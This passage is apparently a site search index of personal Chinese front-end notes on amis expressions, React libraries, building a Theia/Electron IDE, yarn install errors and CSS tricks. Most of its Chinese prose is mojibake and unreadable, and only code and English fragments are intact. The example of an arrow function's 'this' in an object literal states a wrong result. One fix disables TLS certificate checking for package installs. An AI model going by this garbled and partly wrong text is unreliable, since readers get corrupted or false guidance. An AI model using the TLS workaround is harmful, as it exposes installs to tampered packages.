ä»¥ä¸Šæœ€å¤–å±‚å­—æ®µå¿…é¡»æœ‰, å¯ä»¥å¢åŠ , ä¸èƒ½å‡å°‘, data ç±»å‹å¿…æ˜¯å­—å…¸ æ³¨è§£ å¹¶ä¸æ˜¯æ‰€æœ‰ç»„ä»¶éƒ½æ”¯æŒé…ç½®åˆå§‹åŒ–æ¥å£æ¥å®ç°æ•°æ®åŸŸåˆå§‹åŒ–æ“ä½œï¼Œ å¯¹äºé‚£äº› ä¸æ”¯æŒé…ç½®åˆå§‹åŒ–æ¥å£çš„ç»„ä»¶ æ¥è¯´ï¼Œä¸€èˆ¬ä¼šä½¿ç”¨ Service ç»„ä»¶ æ¥è¾…åŠ©å®ç°æ•°æ®åŸŸåˆå§‹åŒ–ï¼› å¦‚æœä¸¤ç§åŒæ—¶é…ç½®, é‚£ä¹ˆå°†ä¼šåˆå¹¶ä¸¤ç§ç»“æœ é‡è¦ ä»€ä¹ˆå«, å…·å¤‡æ•°æ®åŸŸçš„ç»„ä»¶? ç›´ç™½æ¥è¯´, å°±æ˜¯å½“ç»è¿‡è¿™ä¸€å±‚æ—¶å€™, ä¼šåˆ›å»ºæ–°çš„æ•°æ®åŸŸ, è¿™ä¸ªæ—¶å€™ å½“å®šä¹‰dataæ—¶, æ— æ³•ä½¿ç”¨$æ¥å¼•ç”¨ä¸Šå±‚æ•°æ®åŸŸçš„æ•°æ® , è€Œæ˜¯ç›´æ¥å°†å…¶å½“ä½œå­—ç¬¦ä¸². å…·å¤‡æ•°æ®åŸŸçš„ç»„ä»¶(æˆ–è€…è¯´ æ”¯æŒé…ç½®åˆå§‹åŒ–æ¥å£ çš„ç»„ä»¶?): App Page Cards Chart CRUD CRUD2 Dialog Drawer List Page PaginationWrapper Service Wizard Combo InputArray Table Table2 æ³¨è§£ ä¸€èˆ¬å¯¹äºä¸æ”¯æŒæ•°æ®åŸŸçš„ç»„ä»¶, æƒ³ä½¿ç”¨æ•°æ®åŸŸæ—¶, å¾€å¾€æ˜¯åœ¨å¤–å±‚åŒ…è£¹ä¸€å±‚ Service æ•°æ®é“¾ ä¸€èˆ¬æƒ…å†µä¸‹, å­å±‚çš„æ•°æ®åŸŸ, å¦‚æœè·å–çš„å€¼ä¸å­˜åœ¨, ä¼šé€’å½’å‘ä¸ŠæŸ¥æ‰¾, ç”šè‡³å¯ä»¥æ‹¿åˆ°URLè·¯å¾„çš„å‚æ•°(url ä¸­çš„å‚æ•°ä¼šè¿›å…¥é¡¶å±‚æ•°æ®åŸŸ) é»˜è®¤è¡Œä¸º, é¢„å®šä¹‰åªæ‰¾ä¸Šå±‚å’Œä¸Šä¸Šå±‚. å®šä¹‰æŸ¥æ‰¾èŒƒå›´, ä½¿ç”¨ trackExpression : trackExpression: \"none\" : ä¸è¿½è¸ªä»»ä½•æ•°æ® trackExpression: \"${xxxVariable}\" : xxxVariable å˜åŒ–äº†æ›´æ–°å½“å‰ç»„ä»¶çš„æ•°æ®é“¾ å¯ä»¥ç›‘å¬å¤šä¸ªå˜é‡æ¯”å¦‚: \"${xxx1},${xxx2}\"ï¼Œè¿˜å¯ä»¥å†™è¡¨è¾¾å¼å¦‚ \"${ xxx ? xxx : yyy}\"ã€‚ å¦‚æœå˜é‡æ˜¯æ•°ç»„ï¼Œæˆ–è€…å¯¹è±¡ï¼Œä¼šè½¬æˆç»Ÿä¸€çš„å­—ç¬¦ä¸² [object Array] æˆ–è€… [object Object] ; è¿™ä¸ªå…¶å®ä¼šå½±å“æ£€æµ‹çš„ï¼Œæ‰€ä»¥å»ºè®®è½¬æˆ json å­—ç¬¦ä¸²å¦‚ã€‚ ${xxxObject | json}ã€‚ è¿˜æœ‰å°±æ˜¯æ—¢ç„¶æ˜¯ç›‘æ§ä¸Šå±‚æ•°æ®ï¼Œè¡¨è¾¾å¼ä¸­ä¸è¦å†™å½“å‰å±‚æ•°æ®å˜é‡ï¼Œæ˜¯å–ä¸åˆ°çš„ã€‚ é€»è¾‘å‡½æ•° IF(condition, consequent, alternate) -> consequent | alternate ç›¸å½“äºä¸‰ç›®è¡¨è¾¾å¼. AND(expression1, expression2, ...expressionN) -> bool OR(expression1, expression2, ...expressionN) -> bool XOR(condition1, condition2, ...expressionN) -> bool IFS(condition1, result1, condition2, result2,...conditionN, resultN) -> any ç›¸å½“äºå¤šä¸ª else if åˆå¹¶æˆä¸€ä¸ª æ•°å­¦å‡½æ•° ABS(num) -> number æ±‚ç»å¯¹å€¼ MAX(num1, num2, ...numN) -> number å¦‚æœåªæœ‰ä¸€ä¸ªå‚æ•°ä¸”æ˜¯æ•°ç»„ï¼Œåˆ™è®¡ç®—è¿™ä¸ªæ•°ç»„å†…çš„å€¼, ä¸‹åŒ MIN(num1, num2, ...numN) -> number SUM(num1, num2, ...numN) -> number INT(num) -> number MOD(num, divisor) -> number è¿”å›ä¸¤æ•°ç›¸é™¤çš„ä½™æ•°ï¼Œå‚æ•° number æ˜¯è¢«é™¤æ•°ï¼Œdivisor æ˜¯é™¤æ•°ã€‚ PI() -> number åœ†å‘¨ç‡ ROUND(num[, numDigits = 2]) -> number å°†æ•°å­—å››èˆäº”å…¥åˆ°æŒ‡å®šçš„ä½æ•°ï¼Œå¯ä»¥è®¾ç½®å°æ•°ä½ FLOOR(num[, numDigits=2]) å‘ä¸‹å–æ•´ CEIL(num[, numDigits=2]) -> number å°†æ•°å­—å‘ä¸Šå–æ•´åˆ°æŒ‡å®šçš„ä½æ•°ï¼Œå¯ä»¥è®¾ç½®å°æ•°ä½ SQRT(num) -> number å¼€å¹³æ–¹ï¼Œå‚æ•° number ä¸ºéè´Ÿæ•° AVG(num1, num2, ...numN) -> number å¹³å‡å€¼ DEVSQ(num1, num2, ...numN) -> number è¿”å›æ•°æ®ç‚¹ä¸æ•°æ®å‡å€¼ç‚¹ä¹‹å·®ï¼ˆæ•°æ®åå·®ï¼‰çš„å¹³æ–¹å’Œï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªå‚æ•°ä¸”æ˜¯æ•°ç»„ï¼Œåˆ™è®¡ç®—è¿™ä¸ªæ•°ç»„å†…çš„å€¼ã€‚ AVEDEV(num1, num2, ...numN) -> number æ•°æ®ç‚¹åˆ°å…¶ç®—æœ¯å¹³å‡å€¼çš„ç»å¯¹åå·®çš„å¹³å‡å€¼ HARMEAN(num1, num2, ...numN) -> number æ•°æ®ç‚¹çš„è°ƒå’Œå¹³å‡å€¼ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªå‚æ•°ä¸”æ˜¯æ•°ç»„ï¼Œåˆ™è®¡ç®—è¿™ä¸ªæ•°ç»„å†…çš„å€¼ LARGE(array, k) -> number æ•°æ®é›†ä¸­ç¬¬ k ä¸ªæœ€å¤§å€¼ UPPERMONEY(num) -> string å°†æ•°å€¼è½¬ä¸ºä¸­æ–‡å¤§å†™é‡‘é¢ RAND() -> number è¿”å›å¤§äºç­‰äº 0 ä¸”å°äº 1 çš„å‡åŒ€åˆ†å¸ƒéšæœºå®æ•°ã€‚æ¯ä¸€æ¬¡è§¦å‘è®¡ç®—éƒ½ä¼šå˜åŒ– LAST(array) -> any å–æ•°ç»„æœ€åä¸€ä¸ª POW(base, exponent) -> number åŸºæ•° base çš„æŒ‡æ•°æ¬¡å¹‚ æ–‡æœ¬å‡½æ•° å‚è€ƒ: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts /expression#æ–°è¡¨è¾¾å¼è¯­æ³• æ—¥æœŸå‡½æ•° æ•°ç»„å‡½æ•° ç¼–ç å‡½æ•° ENCODEJSON({name: 'amis'}) å°†JSå¯¹è±¡è½¬æ¢æˆJSONå­—ç¬¦ä¸² DECODEJSON('{\"name\": \"amis\"}') è§£æJSONç¼–ç æ•°æ®ï¼Œè¿”å›JSå¯¹è±¡ å…¶ä»–å‡½æ•° GET(obj:any, path:string, defaultValue:any) æ ¹æ®å¯¹è±¡æˆ–è€…æ•°ç»„çš„pathè·¯å¾„è·å–å€¼ã€‚ å¦‚æœè§£æ value æ˜¯ undefined ä¼šä»¥ defaultValue å–ä»£ ISTYPE(obj:any, type: string) åˆ¤æ–­æ˜¯å¦ä¸ºç±»å‹æ”¯æŒï¼šstring, number, array, date, plain-object å¦‚: ISTYPE([{a: '1'}, {b: '2'}, {a: '1'}], 'array') å›¾æ ‡ä½¿ç”¨ è¯¦ç»†è§: https://aisuda.bce.baidu.com/amis/zh-CN/components/icon å¯¼å…¥CSS: @fortawesome/fontawesome-free/css/all.css reactå®‰è£…: yarn add @fortawesome/fontawesome @fortawesome/react-fontawesome @fortawesome/fontawesome-free --save é€šè¿‡åç§°ä½¿ç”¨: { \"type\": \"page\", \"body\": { \"type\": \"icon\", \"icon\": \"cloud\" } } ä¹Ÿæ”¯æŒç”¨url: { \"type\": \"page\", \"body\": { \"type\": \"icon\", \"icon\": \"https://suda.cdn.bcebos.com/images%2F2021-01%2Fdiamond.svg\" } } icon é»˜è®¤æ”¯æŒfontawesome v4(vendoré»˜è®¤ä¸º \"fa\" è¡¨ç¤ºv4)ï¼Œ å¦‚æœæƒ³è¦æ”¯æŒ v5 ä»¥åŠ v6 ç‰ˆæœ¬çš„ fontawesome è¯·è®¾ç½® vendor ä¸ºç©ºå­—ç¬¦ä¸²: { \"type\": \"icon\", \"icon\": \"far fa-address-book\", \"vendor\": \"\" }, v5 ç”¨ far/fas ç­‰è¡¨ç¤ºå‰ç¼€; è¯¦ç»†V5å›¾æ ‡åº“è§: https://fontawesome.com/v5/search?m=free v6 ç”¨ fa-regular / fa-solid ç­‰è¡¨ç¤ºå‰ç¼€: { \"type\": \"icon\", \"icon\": \"fa-regular fa-address-book\", \"vendor\": \"\" }, è¯¦ç»†V6å›¾æ ‡åº“è§: https://fontawesome.com/icons/list","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-amis.html","loc":"/yq-doc-source-docs-front-end-frame-amis-amis.html"},{"title":"é«˜æ€§èƒ½Reactç»„ä»¶","text":"æ»šåŠ¨ç»„ä»¶ Virtuoso Virtuoso æ˜¯ React ä¸­ä¸€ä¸ªéå¸¸å¼ºå¤§çš„æ»šåŠ¨ç»„ä»¶,å®ƒå¯ä»¥å®ç°å‡ åä¸‡æ¡æ•°æ®çš„é«˜æ€§èƒ½æ»šåŠ¨ã€‚ Virtuoso çš„ä¸€äº›ä¸»è¦ç‰¹æ€§åŒ…æ‹¬: æ»šåŠ¨æ€§èƒ½æé«˜ - é€šè¿‡ä»…æ¸²æŸ“å¯è§†åŒºåŸŸå†…çš„ç»„ä»¶æ¥ä¼˜åŒ–æ»šåŠ¨æ€§èƒ½,èƒ½å¤Ÿå¹³æ»‘æ»šåŠ¨æ•°åä¸‡è¡Œæ•°æ®ã€‚ æ»šåŠ¨ä½ç½®è¿½è¸ª - ç²¾ç¡®è¿½è¸ªæ»šåŠ¨ä½ç½®,è§¦å‘åŠ è½½æ›´å¤šç­‰åŠŸèƒ½ã€‚ æ‡’åŠ è½½ - åªæœ‰åœ¨å†…å®¹æ»šåŠ¨åˆ°å¯è§†åŒºåŸŸæ—¶æ‰æ¸²æŸ“,æé«˜åˆå§‹åŠ è½½é€Ÿåº¦ã€‚ æ— é™åŠ è½½ - æ”¯æŒä¸Šæ‹‰æ— é™åŠ è½½æ›´å¤šæ•°æ®ã€‚ çª—å£åŒ– - ä»…åŠ è½½å¯è§†åŒºåŸŸå†…çš„å†…å®¹,é™ä½å†…å­˜å ç”¨ã€‚ å¯å®šåˆ¶ - æä¾›å¤šç§ API è¿›è¡Œå®šåˆ¶,å¯ä»¥è‡ªç”±æ§åˆ¶æ»šåŠ¨æ•ˆæœã€‚ ä½¿ç”¨ Virtuoso å®ç°çš„æ»šåŠ¨æ•ˆæœéå¸¸æµç•…é¡ºæ»‘,åŸºæœ¬æ²¡æœ‰å¡é¡¿,å¹¶ä¸”å¯ä»¥æ‰¿è½½å¾ˆå¤§çš„æ•°æ®é‡ã€‚ å®ƒåˆ©ç”¨äº†è™šæ‹ŸåŒ–æŠ€æœ¯,é€šè¿‡å¤ç”¨ DOM èŠ‚ç‚¹æ¥è¾¾åˆ°é«˜æ€§èƒ½æ»šåŠ¨çš„æ•ˆæœã€‚ ä¸€ä¸ªå¸¸è§çš„ Virtuoso ä½¿ç”¨ç¤ºä¾‹: import { Virtuoso } from 'react-virtuoso'; <Virtuoso data={largeDataSource} itemContent={index => { // æ¸²æŸ“è¡Œ }} onEndReached={loadMore} components={{ Footer: () => <div>Footer</div> }} /> åœ¨ React é¡¹ç›®ä¸­,å¦‚æœéœ€è¦å®ç°é«˜æ€§èƒ½çš„å¤§æ•°æ®é‡æ»šåŠ¨,Virtuoso æ˜¯éå¸¸å¥½çš„é€‰æ‹©ã€‚å®ƒå¯ä»¥åˆ›å»ºå‡ºç±»ä¼¼åŸç”Ÿåº”ç”¨é‚£ä¹ˆæµç•…çš„æ»šåŠ¨æ•ˆæœã€‚ ï¼ˆå·²ç¼–è¾‘ï¼‰","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-High--performance-component.html","loc":"/yq-doc-source-docs-front-end-frame-react-High--performance-component.html"},{"title":"ä¸€äº›å¥½ç”¨çš„reactåº“","text":"react-tooltip å®‰è£…: npm i react-tooltip ç”¨äº é¼ æ ‡ç§»å…¥ æ—¶å€™çš„æç¤ºæ˜¾ç¤º: <div> <a data-tooltip-id=\"my-tooltip\" data-tooltip-content=\"Hello world!\"> â—•â€¿â€¿â—• </a> <Tooltip id='my-tooltip'></Tooltip> </div> æ•ˆæœ rc-tree å®˜ç½‘: https://www.npmjs.com/package//rc-tree å®‰è£…: npm i rc-tree æ•ˆæœ","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-Some-useful-react-libraries.html","loc":"/yq-doc-source-docs-front-end-frame-react-Some-useful-react-libraries.html"},{"title":"åˆ›å»ºè‡ªå·±çš„IDE","text":"å…¶å®è·Ÿç€å®˜æ–¹æ–‡æ¡£èµ°å°±è¡Œäº†, ä¸»è¦å¯èƒ½é‡åˆ°çš„é—®é¢˜å°±æ˜¯ä¾èµ–åŒ…çš„é—®é¢˜, å¯ä»¥ç›´æ¥æŒ‰ç…§å®˜ç½‘æ–‡æ¡£ç»™çš„æ¥: https://theia-ide.org/docs/composing_applications/ , å¤åˆ¶æ–‡æ¡£æœ€åä¸€ä¸ª package.json å³å¯ ä¸è¿‡è¿™é‡Œçš„å°±è¿‡åªæ˜¯ä¸€ä¸ªåŸºäºæµè§ˆå™¨çš„ç‰ˆæœ¬, å¦‚æœæƒ³è¦ä½¿ç”¨ Electron è¿è¡Œ, é‚£ä¹ˆéœ€è¦åœ¨ä¾èµ–é¡¹ä¸­åŠ å…¥ electron å’Œ @theia/electron , åœ¨ theia é¡¹ä¸­åŠ å…¥ç›®æ ‡ä¸º electron å³å¯: \"theia\": { \"target\": \"electron\" } è¿˜éœ€è¦æŒ‡å®šä¸€ä¸‹ electron çš„mainæ–‡ä»¶(å¯åŠ¨æ–‡ä»¶): \"main\": \"lib/backend/electron-main.js\", å¦‚æœæ˜¯è‡ªå®šä¹‰çš„å¯åŠ¨æ–‡ä»¶, éœ€è¦åœ¨è‡ªå®šä¹‰å¯åŠ¨æ–‡ä»¶é‡Œæ‰‹åŠ¨ require å¯¼å…¥ä¸€ä¸‹è¿™ä¸ªåŒ…. è¿™é‡Œä¸éœ€è¦æ‰‹åŠ¨å»å¼„ä¸€ä¸ª electron å¯åŠ¨çš„js, å› ä¸ºtheiaå†…éƒ¨å·²ç»å®šä¹‰å¥½äº†, åªéœ€è¦åˆ¶å®šä¸€ä¸‹ç›®æ ‡, ä»¥åŠæ„å»ºçš„æ—¶å€™ä¹ŸæŒ‡å®šå³å¯: theia rebuild:electron --cacheRoot ./.theia_build/cache è¿™é‡ŒåŠ äº† cacheRoot , è¡¨ç¤ºç¼“å­˜ç›®å½•, ä¸‹æ¬¡å†ç¼–çš„æ—¶å€™å°±ä¼šç”¨è¿™é‡Œçš„æ¯”å¯¹åˆ†æ æœ€ç»ˆçš„package.jsonå†…å®¹å¤§è‡´å¦‚ä¸‹: { \"private\": true, \"name\": \"theia-ide\", \"main\": \"lib/backend/electron-main.js\", \"dependencies\": { \"@theia/callhierarchy\": \"latest\", \"@theia/electron\": \"&#94;1.41.0\", \"@theia/file-search\": \"latest\", \"@theia/git\": \"latest\", \"@theia/markers\": \"latest\", \"@theia/messages\": \"latest\", \"@theia/navigator\": \"latest\", \"@theia/outline-view\": \"latest\", \"@theia/plugin-ext-vscode\": \"latest\", \"@theia/preferences\": \"latest\", \"@theia/preview\": \"latest\", \"@theia/search-in-workspace\": \"latest\", \"@theia/terminal\": \"latest\", \"@theia/vsx-registry\": \"latest\", \"electron\": \"&#94;26.2.1\" }, \"devDependencies\": { \"@theia/cli\": \"latest\", \"electron\": \"&#94;26.2.1\" }, \"scripts\": { \"prepare\": \"yarn run clean && yarn build && yarn run download:plugins\", \"clean\": \"theia clean\", \"build\": \"theia rebuild && theia build --mode development\", \"rebuild\": \"theia rebuild:electron --cacheRoot ./.theia_build/cache\", \"start\": \"theia start --plugins=local-dir:plugins\", \"download:plugins\": \"theia download:plugins\" }, \"theia\": { \"target\": \"electron\" }, \"theiaPluginsDir\": \"plugins\", \"theiaPlugins\": { \"vscode-builtin-extensions-pack\": \"https://open-vsx.org/api/eclipse-theia/builtin-extension-pack/1.50.1/file/eclipse-theia.builtin-extension-pack-1.50.1.vsix\" }, \"theiaPluginsExcludeIds\": [ \"ms-vscode.js-debug-companion\", \"vscode.extension-editing\", \"vscode.git\", \"vscode.git-ui\", \"vscode.github\", \"vscode.github-authentication\", \"vscode.microsoft-authentication\" ] } è¦å¯åŠ¨çš„è¯, ç›´æ¥ yarn install ç„¶å yarn prepare ç¼–è¯‘æ„å»ºä¸‹, å† yarn start å¯åŠ¨å³å¯, æ³¨æ„è§£å†³è¿™æœŸé—´çš„æŠ¥é”™ç­‰ å¦‚æœéœ€è¦ts, åœ¨é¡¹ç›®æ ¹æ‰‹åŠ¨åˆ›å»º tsconfig.json , å†…å®¹å¤§è‡´å¦‚ä¸‹, æŒ‰éœ€ä¿®æ”¹: { \"compilerOptions\": { \"baseUrl\": \".\", \"emitDecoratorMetadata\": true, \"experimentalDecorators\": true, \"module\": \"commonjs\", \"moduleResolution\": \"node\", \"noImplicitAny\": true, \"paths\": { // \"*\": [\"src/*\"] }, \"removeComments\": false, \"sourceMap\": true, \"strict\": true, \"suppressImplicitAnyIndexErrors\": true, \"target\": \"esnext\", \"rootDir\": \"src\", \"outDir\": \"out\", \"jsx\": \"react\" }, \"include\": [ \"src\" ], \"exclude\": [ \"node_modules\" ] } é™„: package.json ç¨å¾®å®Œå–„ä¸€ç‚¹çš„scripts: \"scripts\": { \"build\": \"yarn -s compile && yarn -s bundle\", \"bundle\": \"yarn rebuild && theia build --mode development\", \"clean\": \"theia clean\", \"compile\": \"tsc -b\", \"lint\": \"theiaext lint\", \"rebuild\": \"theia rebuild:electron --cacheRoot ./.theia-build\", \"start\": \"theia start --plugins=local-dir:plugins\", \"start:debug\": \"yarn -s start --log-level=debug --remote-debugging-port=9222\", \"start:watch\": \"concurrently --kill-others -n tsc,bundle,run -c red,yellow,green \\\"tsc -b -w --preserveWatchOutput\\\" \\\"yarn -s watch:bundle\\\" \\\"yarn -s start\\\"\", \"test\": \"electron-mocha --timeout 60000 \\\"./lib/test/**/*.espec.js\\\"\", \"watch\": \"concurrently --kill-others -n tsc,bundle -c red,blue \\\"tsc -b -w --preserveWatchOutput\\\" \\\"yarn -s watch:bundle\\\"\", \"watch:bundle\": \"theia build --watch --mode development\", \"watch:compile\": \"tsc -b -w\" }","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-Create-your-own-IDE.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Create-your-own-IDE.html"},{"title":"ä¸åŒä½ç½®è°ƒç”¨æ—¶çš„thisæŒ‡å‘é—®é¢˜","text":"ä¸¾ä¾‹, æ¯”å¦‚Reactçˆ¶ç»„ä»¶å°†è‡ªå·±çš„æ–¹æ³•ä¼ ç»™å­ç»„ä»¶, ç„¶åå­ç»„ä»¶å†è°ƒç”¨æ­¤æ–¹æ³•. è¿™ä¸ªæ—¶å€™å¯ä»¥è¿›å…¥è¿™ä¸ªä¼ é€’çš„æ–¹æ³•çš„å†…éƒ¨, ä½†æ˜¯, å¦‚æœæ–¹æ³•å†…æœ‰ä½¿ç”¨åˆ° this , é‚£ä¹ˆè¿™ä¸ªæ—¶å€™çš„ this æ˜¯å½“å‰çš„æŒ‡é’ˆ è€Œä¸æ˜¯çˆ¶ç»„ä»¶å®ä¾‹çš„æŒ‡é’ˆ, æ–¹æ³•ä¸€: bind è¿™ä¸ªæ—¶å€™å¯ä»¥ç”¨ bind æ¥è§£å†³è¿™ä¸ªé—®é¢˜, è‹¥åŸæ¥ä¼ ç»™å­ç»„ä»¶çš„æ˜¯: this.close æ”¹æˆ: this.close.bind(this) å³å¯. è¿™é‡Œçš„ this ç›¸å½“äºPythonçš„self æ³¨è§£ ä»…å¯ç”¨äºä¼ é€’çš„æ˜¯å›è°ƒ, è€Œéå€¼ è‹¥å›è°ƒå†…ä¸å«thisè°ƒç”¨å¯ä»¥ä¸bind æ–¹æ³•äºŒ: ç®­å¤´å‡½æ•° ç”¨ä¾‹: () => {this.close()} åœ¨ TypeScript çš„ç®­å¤´å‡½æ•°ä¸­,this çš„æŒ‡å‘æ˜¯ç»§æ‰¿å¤–å±‚ä½œç”¨åŸŸçš„this,è€Œä¸æ˜¯æŒ‡å‘ç®­å¤´å‡½æ•°æœ¬èº«ã€‚ ä¸»è¦åŸå› æœ‰ä¸¤ä¸ª: ç®­å¤´å‡½æ•°ä¸ä¼šåˆ›å»ºè‡ªå·±çš„this,å®ƒåªä¼šä»è‡ªå·±çš„ä½œç”¨åŸŸé“¾çš„ä¸Šä¸€å±‚ç»§æ‰¿thisã€‚ TypeScript çš„ç®­å¤´å‡½æ•°ä¼šæŒ‰ç…§ ES6 çš„è§„èŒƒå®ç°,å…¶ä¸­æ˜ç¡®è§„å®šäº†ç®­å¤´å‡½æ•°å†…çš„thisä¸å¤–å±‚thisç»‘å®šã€‚ ä¸¾ä¾‹æ¥è¯´: const obj = { foo: () => { //è¿™é‡Œçš„thisæŒ‡å‘obj console.log(this) } } obj.foo() // obj åœ¨ä¸Šä¾‹ä¸­,ç®­å¤´å‡½æ•°foo()ç»§æ‰¿äº†objçš„this, æ‰€ä»¥åœ¨å‡½æ•°å†…éƒ¨æ‰“å°çš„thisæ˜¯objå¯¹è±¡,è€Œä¸æ˜¯ç®­å¤´å‡½æ•°æœ¬èº« æ€»ç»“ bindå’Œç®­å¤´å‡½æ•°éƒ½å¯ä»¥å°†thisæŒ‡é’ˆç»‘å®šä¸ºå®šä¹‰æ—¶çš„ç¯å¢ƒ, è€Œéè°ƒç”¨æ—¶çš„ç¯å¢ƒ.","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-Arrow-function-this-point-to-the-problem.html","loc":"/yq-doc-source-docs-front-end-question-Arrow-function-this-point-to-the-problem.html"},{"title":"åŒ…ç®¡ç†å™¨-å¸¸è§æŠ¥é”™","text":"yarn installæ—¶å€™ä¸‹è½½ripgrepä»£ç†é”™è¯¯ æŠ¥é”™å±€éƒ¨ä¿¡æ¯: GET https://api.github.com/repos/microsoft/ripgrep-prebuilt/releases/tags/v13.0.0-2 Deleting invalid download cache Downloading ripgrep failed: TypeError [ERR_INVALID_PROTOCOL]: Protocol \"https:\" not supported. Expected \"http:\" æˆ–è€…: Error: Cannot find module '@vscode/ripgrep/bin/rg' è¿™é‡Œæ˜¯éœ€è¦ä¸‹è½½githubçš„èµ„æº, è€Œç”±äºä¼—æ‰€å‘¨çŸ¥çš„åŸå› , ä¸‹è½½ä¸äº†, æ‰€ä»¥ç”¨clashé…ç½®äº†ä»£ç†, å¹¶ç»™yarnä¸nodeéƒ½è®¾ç½®äº†ä»£ç†, è¿™é‡ŒæŠ¥é”™æ˜¯æŸä¸ªnodeæ¨¡å—çš„é—®é¢˜, å°è¯•å¤šæ¬¡åéƒ½æ— æ³•è§£å†³, åé¢åœ¨ https://github.com/microsoft/vscode-ripgrep/issues/26 çœ‹åˆ°äº†ä¸€ä¸ªè§£å†³åŠæ³•: 1. Clone ripgrep locally: git clone git@github.com:microsoft/vscode-ripgrep ~/vscode-ripgrep 2. run yarn in that folder (this seems to work even behind proxy) 3. cp bin/rg ~/vscode-repo-path/node_modules/@vscode/ripgrep 4. run yarn in your vscode repo path again å¤§è‡´codeå¦‚ä¸‹: git clone https://github.com/microsoft/vscode-ripgrep.git cd vscode-ripgrep yarn cp bin/rg ../myproject/node_modules/@vscode/ripgrep yarn å®‰è£…æ—¶å€™è¯ä¹¦è¿‡æœŸ å¦‚: error ~/test-electron-win/node_modules/electron: Command failed. Exit code: 1 Command: node install.js Arguments: Directory:~/test-electron-win/node_modules/electron Output: RequestError: certificate has expired at ClientRequest.<anonymous> ç½‘ä¸Šè¿™ä¸ªé—®é¢˜å¾ˆå¤š, ä¸”å¥½å¤šå¹´æ¥ä¸€ç›´éƒ½æœ‰, ä½†æ˜¯è§£å†³åŠæ³•å¯¥å¯¥æ— å‡ , æœ€ç»ˆè¿˜æ˜¯è®¾ç½®å¿½ç•¥ç¯å¢ƒå˜é‡è§£å†³. å‚è€ƒ: https://github.com/realm/realm-js/issues/5228#issuecomment-1375191886 å…ˆä½¿ç”¨ç¯å¢ƒå˜é‡æ¥å¿½ç•¥è¯ä¹¦éªŒè¯: NODE_TLS_REJECT_UNAUTHORIZED=0 yarn install è²Œä¼¼è¿™æ ·å®‰è£…ä¸€æ¬¡åå°±æœ‰ç¼“å­˜äº†, ç„¶åæ”¹ç‰ˆæœ¬ä»¥åç›´æ¥ yarn install ä¹Ÿå¯ä»¥, ä¸ç¡®å®šæ˜¯å¦åœ¨ç¼“å­˜çš„è¯, å°±è¿˜æ˜¯åŠ ä¸Š NODE_TLS_REJECT_UNAUTHORIZED å§.","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-Bag-Manager-Common-errors.html","loc":"/yq-doc-source-docs-front-end-question-Bag-Manager-Common-errors.html"},{"title":"æµè§ˆå™¨ç¼“å­˜æ¸…ç†","text":"safariæ¸…ç†ç¼“å­˜ Command + , æ‰“å¼€è®¾ç½®: éšç§ -> ç®¡ç†ç½‘ç«™æ•°æ® -> `é€‰ä¸­éœ€è¦ç§»é™¤çš„ç½‘ç«™(å¯æœç´¢)` -> ç§»é™¤ safari æ¸…ç†æŸç½‘ç«™ç¼“å­˜","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-Browser-cache-cleaning.html","loc":"/yq-doc-source-docs-front-end-question-Browser-cache-cleaning.html"},{"title":"JSXæˆ–TSXçš„èŠ±æ‹¬å·","text":"å•èŠ±æ‹¬å·è¡¨ç¤ºè¿›å…¥JSè¯­æ³•ç¯å¢ƒ, åŒèŠ±æ‹¬å·è¡¨ç¤ºJSç¯å¢ƒå†…åˆ›å»ºä¸€ä¸ªå¯¹è±¡","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-Bunder-of-JSX-or-TSX.html","loc":"/yq-doc-source-docs-front-end-question-Bunder-of-JSX-or-TSX.html"},{"title":"CSSæ’é™¤æŒ‡å®šçš„é€‰æ‹©å™¨","text":"å¯å‚è€ƒ :doc:`` ç°æœ‰cssç±»å±æ€§a,b,c; aä¸‹åŒ…å«bå’Œc, bä¸‹åŒ…å«c å¦‚ä½•å†™cssé€‰æ‹©å™¨, é€‰æ‹© aä¸‹çš„ ä¸å±äºb çš„c: .a .c:not(.b .c)","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-CSS-exclude-the-specified-selector.html","loc":"/yq-doc-source-docs-front-end-question-CSS-exclude-the-specified-selector.html"},{"title":"è‡ªå®šä¹‰æ ·å¼çš„Checkbox","text":"æ¯”å¦‚åœ†å½¢è¾¹æ¡† é»˜è®¤æƒ…å†µä¸‹ï¼Œinput å…ƒç´ çš„å¤é€‰æ¡†ï¼ˆcheckboxï¼‰çš„å¤–è§‚æ˜¯ç”±æµè§ˆå™¨è‡ªèº«çš„æ ·å¼å†³å®šçš„ï¼Œ å¹¶ä¸”è¿™äº›æ ·å¼é€šå¸¸ä¸å…è®¸ç›´æ¥é€šè¿‡ CSS çš„ border-radius å±æ€§æ¥è®¾ç½®åœ†å½¢è¾¹æ¡†ã€‚ å…ˆä½¿ç”¨iæ ‡ç­¾å®ç°ä¸€ä¸ªç®€å•çš„Checkbox: import React from 'react'; interface CheckedProps{ name?: string initChecked?: boolean description?: string } export class Checkbox extends React.Component<CheckedProps, any> { state = { boxChecked: false } protected changeChecked() { this.setState({boxChecked: !this.state.boxChecked}) } render() { if (typeof this.props.initChecked === \"boolean\"){ this.setState({boxChecked: this.props.initChecked}) } const description = this.props.description return ( <div className={'custom-checkbox-0'}> <input type={'checkbox'} checked={this.state.boxChecked} /> <i onClick={() => {this.changeChecked()}} /> <span /> {description ? ( <div>{description}</div> ) : null} </div> ); } } ä¸»è¦æ˜¯æ ·å¼çš„è®¾ç½®: /* inputæ ‡ç­¾æ ·å¼ inputç¦æ­¢æ‰é»˜è®¤çš„ç‚¹å‡»è¡Œä¸º, äº¤ç»™iæ ‡ç­¾ */ .custom-checkbox-0 > input[type=\"checkbox\"] { position: absolute; clip: rect(1px, 1px, 1px, 1px); pointer-events: none; } /* æ™®é€šçŠ¶æ€ä¸‹ **<i>æ ‡ç­¾å†…å®¹** çš„æ ·å¼ å³æ²¡æœ‰æ‰“å‹¾ */ .custom-checkbox-0 > i::before{ content: \"\"; position: absolute; 